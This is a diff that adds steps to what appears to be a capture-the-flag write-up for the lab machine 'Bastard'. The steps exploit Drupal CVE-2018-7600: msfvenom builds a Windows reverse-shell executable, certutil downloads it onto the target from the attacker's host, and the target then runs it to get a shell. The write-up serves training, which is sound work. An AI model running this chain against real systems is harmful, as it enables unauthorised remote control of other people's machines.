@@ -15,6 +15,22 @@ thus i drop the idea of running droopescan
 
 ![Bastard_change](https://user-images.githubusercontent.com/55708909/91457435-fa9a0d00-e8a1-11ea-839b-546a8a84c1bb.png)
 
+For this particular version there is a python exploit drupa7-CVE-2018-7600.py
+
+Upload the shell using this python exploit, 
+
+Step1:  msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=10.10.14.6 LPORT=4444 -f exe >> shell.exe
+
+Step2:  Upload the shell.exe using this commands
+
+python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c  "certutil.exe -urlcache -split -f http://10.10.14.6/shell1.exe  c:\Windows\Temp\shell1.exe"
+
+Step3 : Execute the reverse shell using these commands
+
+python drupa7-CVE-2018-7600.py http://10.10.10.9/ -c  "c:\Windows\Temp\shell1.exe"
+
+We have a shell here.
+
 
 
 
